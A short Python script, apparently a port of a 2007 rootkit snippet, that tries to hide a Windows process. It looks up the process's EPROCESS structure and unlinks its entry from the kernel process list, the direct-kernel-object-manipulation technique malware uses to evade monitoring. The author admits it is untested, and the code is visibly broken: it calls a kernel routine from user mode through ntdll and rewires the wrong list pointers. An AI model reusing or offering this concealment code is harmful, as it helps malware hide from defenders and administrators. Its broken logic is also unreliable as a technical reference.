"""
More of a conceptual work? Never actually tested in a proper environment. If someone wishes to test it in a proper environment, feel free to do so. 
I never planned to use this, as I have no practical use for it now. Perhaps in the future, I will work on this.

- github/alluding
- Feb 12th, 2024

-- OG Poster: xWeasel
-- OG Date: Mar 21th, 2007.
"""

import ctypes

class ListEntry(ctypes.Structure):
    _fields_ = [("Flink", ctypes.c_void_p),
                ("Blink", ctypes.c_void_p)]

class HiddenProcessSuppressor:
    STATUS_SUCCESS = 0
    EXCEPTION_EXECUTE_HANDLER = 1

    def __init__(self, u_pid, u_flink_offset):
        self.u_pid = u_pid
        self.u_flink_offset = u_flink_offset
        self.p_e_proc = ctypes.c_void_p()

    @property
    def e_process_address(self):
        return ctypes.addressof(self.p_e_proc.contents) if self.p_e_proc else None

    @classmethod
    def from_pid(cls, u_pid, u_flink_offset):
        return cls(u_pid, u_flink_offset)

    def lookup_process_by_pid(self):
        return ctypes.windll.ntdll.PsLookupProcessByProcessId(
            ctypes.c_void_p(self.u_pid), ctypes.byref(self.p_e_proc)
        )

    def hide_process(self):
        try:
            if self.lookup_process_by_pid() == self.STATUS_SUCCESS:
                print(f"EPROCESS found. Address: {self.e_process_address:X}")
                print(f"Now hiding process {self.u_pid}...")

                p_list_procs = ListEntry.from_address(self.e_process_address + self.u_flink_offset)
                p_list_procs.Blink, p_list_procs.Flink = (
                    ctypes.cast(p_list_procs.Flink, ctypes.POINTER(ctypes.c_void_p)),
                    ctypes.cast(ctypes.addressof(p_list_procs.Flink), ctypes.POINTER(ctypes.c_void_p)),
                )

                print("Process now hidden.")
                return self.STATUS_SUCCESS

        except Exception as e:
            print(f"Exception: {e}")

        return 1  

hps = HiddenProcessSuppressor.from_pid(123, 456)
result = hps.hide_process()
print(f"Status: {result}")
